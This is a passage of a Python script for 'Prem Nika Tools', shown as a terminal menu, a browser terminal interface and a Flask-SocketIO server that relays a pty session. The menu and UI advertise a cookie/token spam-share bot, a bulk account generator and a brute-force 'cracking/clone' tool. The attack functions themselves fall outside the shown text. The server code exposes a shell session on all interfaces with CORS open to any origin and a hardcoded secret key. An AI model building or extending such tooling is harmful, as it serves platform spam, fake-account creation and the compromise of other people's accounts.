        print(f"""  {GOLD}╔══════════════════════════════════════════════╗{RST}
  {GOLD}║{BOLD}{GOLD}   MAIN MENU — PREM NIKA TOOLS               {RST}{GOLD}║{RST}
  {GOLD}╠══════════════════════════════════════════════╣{RST}
  {GOLD}║{RST}  {TEAL}[1]{RST}  SPAM SHARE   — Token / Cookie Bot      {GOLD}║{RST}
  {GOLD}║{RST}  {MINT}[2]{RST}  AUTO CREATE  — Account Generator        {GOLD}║{RST}
  {GOLD}║{RST}  {RED}[3]{RST}  CRACKING     — Brute Force / Clone       {GOLD}║{RST}
  {GOLD}║{RST}  {GRY}[0]{RST}  EXIT                                    {GOLD}║{RST}
  {GOLD}╚══════════════════════════════════════════════╝{RST}
""")
        ch = input(f"  {GOLD}{BOLD}[>>]{RST}  {CYN}CHOICE{RST}  {GOLD}:{RST} {WHT}").strip()
        if ch == '1':
            menu_spam_share()
        elif ch == '2':
            menu_auto_create()
        elif ch == '3':
            menu_cracking()
        elif ch == '0':
            clr()
            print(f"\n  {GOLD}{BOLD}  Goodbye — PREM NIKA Tools{RST}\n")
            sys.exit(0)
        else:
            print(f"  {RED}[!] Enter 1, 2, 3 or 0{RST}")
            time.sleep(0.8)

# ── TERMINAL MODE ─────────────────────────────────────────────
def run_terminal():
    clr()
    print(BANNER)
    time.sleep(0.3)
    master_menu()

# ── WEB UI HTML ───────────────────────────────────────────────
WEB_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Prem Nika Tools Suite v3.1</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.min.css"/>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    :root{
      --gold:#f5c518;--teal:#22d3ee;--mint:#4ade80;
      --red:#f87171;--bg:#0a0a0f;--bg2:#0f0f1a;--bg3:#13131f;
      --border:#1e1e2e;--border2:#2a2a3e;
      --text:#e2e8f0;--text2:#94a3b8;--text3:#64748b;
    }
    body{background:var(--bg);color:var(--text);font-family:'JetBrains Mono','Fira Code','Courier New',monospace;min-height:100vh;display:flex;flex-direction:column;overflow:hidden}
    .header{background:linear-gradient(135deg,var(--bg2),var(--bg3));border-bottom:1px solid var(--border2);padding:0 24px;display:flex;align-items:center;justify-content:space-between;height:60px;flex-shrink:0;box-shadow:0 2px 20px rgba(0,0,0,.5)}
    .logo{display:flex;align-items:center;gap:12px}
    .logo-title{font-size:14px;font-weight:700;color:var(--gold);letter-spacing:.08em}
    .logo-sub{font-size:10px;color:var(--text3);letter-spacing:.12em}
    .badge{background:rgba(245,197,24,.1);border:1px solid rgba(245,197,24,.3);color:var(--gold);font-size:10px;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:.1em}
    .status-dot{width:8px;height:8px;border-radius:50%;background:var(--mint);box-shadow:0 0 6px var(--mint);animation:pulse 2s infinite}
    @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
    .header-right{display:flex;align-items:center;gap:16px}
    .main{flex:1;display:flex;min-height:0;overflow:hidden}
    .sidebar{width:220px;flex-shrink:0;background:var(--bg2);border-right:1px solid var(--border2);display:flex;flex-direction:column;overflow-y:auto}
    .sidebar-section{padding:16px 12px 4px}
    .sidebar-label{font-size:9px;font-weight:700;color:var(--text3);letter-spacing:.15em;text-transform:uppercase;margin-bottom:8px}
    .tool-card{display:flex;align-items:center;gap:10px;padding:10px 12px;border-radius:8px;margin-bottom:4px;cursor:pointer;border:1px solid transparent;transition:all .15s}
    .tool-card:hover{border-color:var(--border2);background:rgba(255,255,255,.04)}
    .tool-card.active{border-color:rgba(245,197,24,.4);background:rgba(245,197,24,.07)}
    .tool-card.active .tool-num{color:var(--gold)}
    .tool-icon{width:32px;height:32px;border-radius:6px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
    .ti-1{background:rgba(34,211,238,.12);border:1px solid rgba(34,211,238,.25)}
    .ti-2{background:rgba(74,222,128,.12);border:1px solid rgba(74,222,128,.25)}
    .ti-3{background:rgba(248,113,113,.12);border:1px solid rgba(248,113,113,.25)}
    .tool-info{flex:1;min-width:0}
    .tool-name{font-size:11px;font-weight:700;color:var(--text);letter-spacing:.03em}
    .tool-desc{font-size:9px;color:var(--text3);margin-top:1px}
    .tool-num{font-size:10px;color:var(--text3);font-weight:700}
    .sidebar-divider{height:1px;background:var(--border);margin:12px}
    .exit-btn{margin:8px 12px 16px;display:flex;align-items:center;gap:10px;padding:9px 12px;border-radius:8px;cursor:pointer;border:1px solid rgba(248,113,113,.2);background:rgba(248,113,113,.05);color:var(--red);font-size:11px;font-weight:700;letter-spacing:.05em;transition:all .15s}
    .exit-btn:hover{background:rgba(248,113,113,.12);border-color:rgba(248,113,113,.4)}
    .terminal-wrap{flex:1;display:flex;flex-direction:column;background:var(--bg);min-width:0;overflow:hidden}
    .terminal-header{background:var(--bg2);border-bottom:1px solid var(--border);padding:8px 16px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0}
    .term-title{display:flex;align-items:center;gap:8px;font-size:12px;font-weight:700;color:var(--text2);letter-spacing:.05em}
    .term-controls{display:flex;gap:6px}
    .ctrl-dot{width:12px;height:12px;border-radius:50%;cursor:pointer;transition:opacity .15s}
    .ctrl-dot:hover{opacity:.7}
    .cd-close{background:#ff5f57}.cd-min{background:#febc2e}.cd-max{background:#28c840}
    .terminal-container{flex:1;padding:8px;min-height:0}
    #terminal{height:100%;width:100%}
    .overlay{position:fixed;inset:0;background:rgba(10,10,15,.96);display:flex;align-items:center;justify-content:center;z-index:100}
    .overlay-box{background:var(--bg2);border:1px solid var(--border2);border-radius:16px;padding:40px 48px;text-align:center;max-width:420px;width:90%}
    .ov-icon{margin-bottom:20px}
    .ov-title{font-size:18px;font-weight:700;color:var(--gold);margin-bottom:8px;letter-spacing:.05em}
    .ov-sub{font-size:12px;color:var(--text3);margin-bottom:24px}
    .ov-bar{height:3px;background:var(--border2);border-radius:2px;overflow:hidden}
    .ov-fill{height:100%;background:linear-gradient(90deg,var(--teal),var(--gold));border-radius:2px;animation:load 2.2s ease-in-out forwards}
    @keyframes load{0%{width:0}70%{width:80%}100%{width:100%}}
    .ov-status{font-size:10px;color:var(--text3);margin-top:12px;letter-spacing:.08em}
    svg{display:block}
  </style>
</head>
<body>
<div class="overlay" id="overlay">
  <div class="overlay-box">
    <div class="ov-icon">
      <svg width="56" height="56" viewBox="0 0 56 56" fill="none" style="margin:auto">
        <rect width="56" height="56" rx="14" fill="rgba(245,197,24,0.1)"/>
        <rect x="1" y="1" width="54" height="54" rx="13" stroke="rgba(245,197,24,0.3)" stroke-width="1"/>
        <path d="M14 20h28M14 28h28M14 36h16" stroke="#f5c518" stroke-width="2" stroke-linecap="round"/>
        <circle cx="38" cy="36" r="6" fill="rgba(74,222,128,0.15)" stroke="#4ade80" stroke-width="1.5"/>
        <path d="M36 36l1.5 1.5L40 34" stroke="#4ade80" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </div>
    <div class="ov-title">PREM NIKA TOOLS SUITE</div>
    <div class="ov-sub">Connecting secure terminal session...</div>
    <div class="ov-bar"><div class="ov-fill"></div></div>
    <div class="ov-status" id="ov-status">INITIALIZING</div>
  </div>
</div>
<div class="header">
  <div class="logo">
    <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
      <rect width="36" height="36" rx="9" fill="rgba(245,197,24,0.1)"/>
      <rect x=".5" y=".5" width="35" height="35" rx="8.5" stroke="rgba(245,197,24,0.3)"/>
      <path d="M8 12h20M8 18h20M8 24h12" stroke="#f5c518" stroke-width="1.8" stroke-linecap="round"/>
      <circle cx="26" cy="24" r="4.5" fill="rgba(74,222,128,0.15)" stroke="#4ade80" stroke-width="1.4"/>
      <path d="M24.5 24l1 1 2-2" stroke="#4ade80" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
    <div>
      <div class="logo-title">PREM NIKA TOOLS</div>
      <div class="logo-sub">PREM NIKA · v3.1</div>
    </div>
  </div>
  <div class="header-right">
    <span class="badge">KEY VERIFIED</span>
    <div class="status-dot"></div>
  </div>
</div>
<div class="main">
  <div class="sidebar">
    <div class="sidebar-section">
      <div class="sidebar-label">Tools</div>
      <div class="tool-card active" id="tc1" onclick="sendCmd('1',this)">
        <div class="tool-icon ti-1">
          <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
            <path d="M3 9h12M9 3l6 6-6 6" stroke="#22d3ee" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
        </div>
        <div class="tool-info">
          <div class="tool-name">SPAM SHARE</div>
          <div class="tool-desc">Cookie · Token · Post Bot</div>
        </div>
        <div class="tool-num">[1]</div>
      </div>
      <div class="tool-card" id="tc2" onclick="sendCmd('2',this)">
        <div class="tool-icon ti-2">
          <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
            <circle cx="9" cy="6" r="3" stroke="#4ade80" stroke-width="1.5"/>
            <path d="M3 15c0-3.314 2.686-6 6-6s6 2.686 6 6" stroke="#4ade80" stroke-width="1.5" stroke-linecap="round"/>
          </svg>
        </div>
        <div class="tool-info">
          <div class="tool-name">AUTO CREATE</div>
          <div class="tool-desc">Account · 2FA · Cookies</div>
        </div>
        <div class="tool-num">[2]</div>
      </div>
      <div class="tool-card" id="tc3" onclick="sendCmd('3',this)">
        <div class="tool-icon ti-3">
          <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
            <rect x="2" y="5" width="14" height="10" rx="2" stroke="#f87171" stroke-width="1.5"/>
            <path d="M6 5V4a3 3 0 016 0v1" stroke="#f87171" stroke-width="1.5" stroke-linecap="round"/>
            <circle cx="9" cy="10" r="1.5" fill="#f87171"/>
          </svg>
        </div>
        <div class="tool-info">
          <div class="tool-name">CRACKING</div>
          <div class="tool-desc">Brute Force · Clone</div>
        </div>
        <div class="tool-num">[3]</div>
      </div>
    </div>
    <div class="sidebar-divider"></div>
    <div class="sidebar-section">
      <div class="sidebar-label">Session</div>
      <div class="tool-card" style="cursor:default">
        <div class="tool-icon" style="background:rgba(100,116,139,.1);border:1px solid rgba(100,116,139,.2)">
          <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
            <circle cx="9" cy="9" r="6" stroke="#64748b" stroke-width="1.5"/>
            <path d="M9 6v3l2 2" stroke="#64748b" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
        </div>
        <div class="tool-info">
          <div class="tool-name" style="color:var(--text2);font-size:10px">STATUS</div>
          <div class="tool-desc" id="sess-status">Connecting...</div>
        </div>
      </div>
    </div>
    <div style="flex:1"></div>
    <div class="sidebar-divider"></div>
    <div class="exit-btn" onclick="sendCmd('0',null)">
      <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
        <path d="M6 2H3a1 1 0 00-1 1v10a1 1 0 001 1h3M10 11l3-3-3-3M13 8H6" stroke="#f87171" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
      EXIT TOOL
    </div>
  </div>
  <div class="terminal-wrap">
    <div class="terminal-header">
      <div class="term-title">
        <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
          <rect x="1" y="2" width="12" height="10" rx="2" stroke="#94a3b8" stroke-width="1.2"/>
          <path d="M3 5l2 2-2 2M7 9h3" stroke="#94a3b8" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
        TERMINAL — PREM NIKA TOOLS SUITE
      </div>
      <div class="term-controls">
        <div class="ctrl-dot cd-close" title="Disconnect" onclick="socket&&socket.disconnect()"></div>
        <div class="ctrl-dot cd-min"   title="Clear"      onclick="term.clear()"></div>
        <div class="ctrl-dot cd-max"   title="Fullscreen" onclick="toggleFull()"></div>
      </div>
    </div>
    <div class="terminal-container"><div id="terminal"></div></div>
  </div>
</div>
<script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.min.js"></script>
<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
<script>
const term = new Terminal({
  cursorBlink:true, fontSize:13,
  fontFamily:'"JetBrains Mono","Fira Code","Cascadia Code","Courier New",monospace',
  lineHeight:1.3, scrollback:5000, allowTransparency:true,
  theme:{
    background:'#0a0a0f',foreground:'#e2e8f0',cursor:'#f5c518',cursorAccent:'#0a0a0f',
    selectionBackground:'rgba(245,197,24,0.25)',
    black:'#1e1e2e',brightBlack:'#45475a',red:'#f87171',brightRed:'#ff7070',
    green:'#4ade80',brightGreen:'#a3e635',yellow:'#f5c518',brightYellow:'#fde68a',
    blue:'#60a5fa',brightBlue:'#93c5fd',magenta:'#e879f9',brightMagenta:'#f0abfc',
    cyan:'#22d3ee',brightCyan:'#67e8f9',white:'#cbd5e1',brightWhite:'#f8fafc',
  }
});
const fit = new FitAddon.FitAddon();
term.loadAddon(fit);
term.open(document.getElementById('terminal'));
fit.fit();
const socket = io({transports:['websocket']});
let connected = false;
socket.on('connect', ()=>{
  connected = true;
  document.getElementById('sess-status').textContent = 'Active';
  document.getElementById('ov-status').textContent   = 'CONNECTED';
  setTimeout(()=>{ document.getElementById('overlay').style.display='none'; }, 600);
});
socket.on('disconnect', ()=>{
  connected = false;
  document.getElementById('sess-status').textContent = 'Disconnected';
  term.writeln('\r\n\x1b[38;5;196m  [!] Session disconnected. Refresh to reconnect.\x1b[0m');
});
socket.on('output', d => term.write(d.data));
term.onData(d => { if(connected) socket.emit('input',{data:d}); });
function sendCmd(cmd, el){
  if(connected) socket.emit('input',{data:cmd+'\r'});
  document.querySelectorAll('.tool-card').forEach(c=>c.classList.remove('active'));
  if(el) el.classList.add('active');
}
window.addEventListener('resize',()=>{ fit.fit(); socket.emit('resize',{rows:term.rows,cols:term.cols}); });
function toggleFull(){
  if(!document.fullscreenElement) document.documentElement.requestFullscreen();
  else document.exitFullscreen();
}
</script>
</body>
</html>"""

# ── WEB / LOCALHOST MODE ──────────────────────────────────────
WEB_PORT = int(os.environ.get('PORT', 5000))

def run_web():
    try:
        from flask import Flask, Response
        from flask_socketio import SocketIO
        import ptyprocess
    except ImportError:
        print(f"\n  Installing web dependencies (first run only)...\n")
        os.system(f"{sys.executable} -m pip install flask flask-socketio ptyprocess -q")
        from flask import Flask, Response
        from flask_socketio import SocketIO
        import ptyprocess

    from flask import request as flask_request

    app = Flask(__name__)
    app.config['SECRET_KEY'] = 'nikaclients2024'
    socketio = SocketIO(app, cors_allowed_origins='*', async_mode='threading')

    _sessions = {}

    @app.route('/')
    def index():
        return Response(WEB_HTML, mimetype='text/html')

    @socketio.on('connect')
    def on_connect():
        sid = flask_request.sid
        cols, rows = 220, 50
        proc = ptyprocess.PtyProcessUnicode.spawn(
            [sys.executable, os.path.abspath(__file__), '--terminal-mode'],
            dimensions=(rows, cols),
            env={**os.environ,
                 'TERM': 'xterm-256color',
                 'COLUMNS': str(cols),
                 'LINES': str(rows)}
        )
        _sessions[sid] = proc

        def _reader():
            try:
                while True:
                    data = proc.read(4096)
                    socketio.emit('output', {'data': data}, to=sid)
            except Exception:
                socketio.emit('output',
                    {'data': '\r\n\x1b[91m[Session ended]\x1b[0m\r\n'}, to=sid)

        threading.Thread(target=_reader, daemon=True).start()

    @socketio.on('input')
    def on_input(data):
        proc = _sessions.get(flask_request.sid)
        if proc and proc.isalive():
            proc.write(data.get('data', ''))

    @socketio.on('resize')
    def on_resize(data):
        proc = _sessions.get(flask_request.sid)
        if proc and proc.isalive():
            proc.setwinsize(data.get('rows', 24), data.get('cols', 80))

    @socketio.on('disconnect')
    def on_disconnect():
        proc = _sessions.pop(flask_request.sid, None)
        if proc and proc.isalive():
            proc.terminate(force=True)

    print(f"\n  {GOLD}{BOLD}╔═══════════════════════════════════════════════╗{RST}")
    print(f"  {GOLD}{BOLD}║{RST}                                               {GOLD}{BOLD}║{RST}")
    print(f"  {GOLD}{BOLD}║{RST}  {TEAL}  Web terminal is ready                   {RST}  {GOLD}{BOLD}║{RST}")
    print(f"  {GOLD}{BOLD}║{RST}  {WHT}  Open: http://localhost:{WEB_PORT:<21}{RST}{GOLD}{BOLD}║{RST}")
    print(f"  {GOLD}{BOLD}║{RST}                                               {GOLD}{BOLD}║{RST}")
    print(f"  {GOLD}{BOLD}╚═══════════════════════════════════════════════╝{RST}")
    print(f"  {GRY}  Press Ctrl+C to stop the server{RST}\n")

    socketio.run(app, host='0.0.0.0', port=WEB_PORT, debug=False)

# ── ENTRY POINT ───────────────────────────────────────────────
if __name__ == '__main__':
    if '--terminal-mode' in sys.argv:
        run_terminal()
    else:
        check_key()
        mode = select_mode()
        if mode == 'terminal':
            run_terminal()
        else:
            run_web()
